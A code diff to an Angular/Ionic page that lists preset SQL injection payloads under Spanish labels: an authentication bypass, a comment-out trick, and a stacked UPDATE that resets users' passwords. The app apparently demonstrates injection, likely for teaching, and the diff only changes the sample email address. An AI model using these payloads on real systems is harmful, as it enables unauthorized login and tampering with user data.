@@ -87,14 +87,14 @@ export class Tab2Page {
         {
           text: ' Bypass de Autenticación',
           data: {
-            email: "jhon1@example.com' OR '1'=='1",
+            email: "user@example.com' OR '1'=='1",
             password: '1',
           },
         },
         {
           text: 'Comentario para Anular la Consulta',
           data: {
-            email: "jhon1@example.com' --",
+            email: "user@example.com' --",
             password: '1',
           },
         },
@@ -102,7 +102,7 @@ export class Tab2Page {
           text: 'Modificar Datos',
           data: {
             email:
-              "jhon1@example.com'; UPDATE users SET password='hacked' WHERE email='jhon1@example.com'; --",
+              "user@example.com'; UPDATE users SET password='hacked' WHERE email='user@example.com'; --",
             password: '1',
           },
         },
